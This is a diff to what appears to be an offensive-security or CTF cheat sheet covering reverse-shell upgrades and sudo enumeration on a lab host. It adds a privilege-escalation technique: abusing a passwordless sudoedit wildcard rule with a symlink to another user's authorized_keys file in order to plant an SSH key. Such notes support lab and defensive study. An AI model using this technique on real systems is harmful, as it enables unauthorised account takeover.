@@ -29,6 +29,8 @@ On Victim (launch):
 If socat isn't installed, you're not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:
 https://github.com/andrew-d/static-binaries
 
+
+
 ## Python + full options
 Using stty options
 
@@ -98,6 +100,13 @@ Linux tenten 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64
 # Sudo info
 ```
 sudo -l
+
+Config:
+sudoedit_follow, !sudoedit_checkdir : can edit file with symlink in other dir...
+(alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html 
+We can modify a file. e.g. : add a key in alekos
+ln -s /home/alekos/.ssh/authorized_keys layout.html 
+
 ```
 
 # Find user information
